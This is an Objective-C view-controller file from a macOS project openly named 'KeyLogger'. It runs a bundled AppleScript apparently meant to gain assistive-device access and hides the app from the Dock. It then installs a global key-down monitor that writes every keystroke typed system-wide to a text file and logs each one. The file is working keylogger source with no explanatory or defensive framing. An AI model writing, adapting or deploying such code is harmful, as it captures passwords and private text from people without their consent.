//
//  ViewController.m
//  KeyLogger
//
//  Created by Muruganandham.Kuppan on 09/11/18.
//  Copyright © 2018 Muruganandham.Kuppan. All rights reserved.
//

#import "ViewController.h"

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    // Do any additional setup after loading the view.
}


- (void)setRepresentedObject:(id)representedObject {
    [super setRepresentedObject:representedObject];

    // Update the view, if already loaded.
}


- (IBAction)startRecordActn:(id)sender {
    
    NSString* path = [[NSBundle mainBundle] pathForResource:@"setAccesForAssistiveDevice" ofType:@"scpt"];
    NSURL* url = [NSURL fileURLWithPath:path];
    NSDictionary* errors = [NSDictionary dictionary];
    NSAppleScript* appleScript = [[NSAppleScript alloc] initWithContentsOfURL:url error:&errors];
    
    NSAppleEventDescriptor *theDescriptor = [appleScript executeAndReturnError:&errors];
    
    NSString *theResult = [theDescriptor stringValue];
    NSLog(@"re: %@",theResult);

//if yes start capture
    [self capture];
}

-(void)capture
{
    [NSApp setActivationPolicy: NSApplicationActivationPolicyAccessory];
    NSArray *paths = NSSearchPathForDirectoriesInDomains
    (NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    
    
    //make a file name to write the data to using the documents directory:
    NSString *fileName = [NSString stringWithFormat:@"%@/textfile.txt",
                          documentsDirectory];
    
    /* Users/<Username>/Library/Containers/<bundle-id>/Data/Documents*/
    
    
    [NSEvent addGlobalMonitorForEventsMatchingMask:(NSEventMaskKeyDown) handler:^(NSEvent *event){
        NSLog(@"Log: User typed: %@ %d", event.characters,event.keyCode);
        
        NSString * str = [NSString stringWithContentsOfFile:fileName encoding:NSUTF8StringEncoding error:nil];
        NSString * strnew = [NSString stringWithFormat:@"%@%@",str,event.characters];
        
        [strnew writeToFile:fileName
                 atomically:NO
                   encoding:NSStringEncodingConversionAllowLossy
                      error:nil];
        
    }];
}
@end
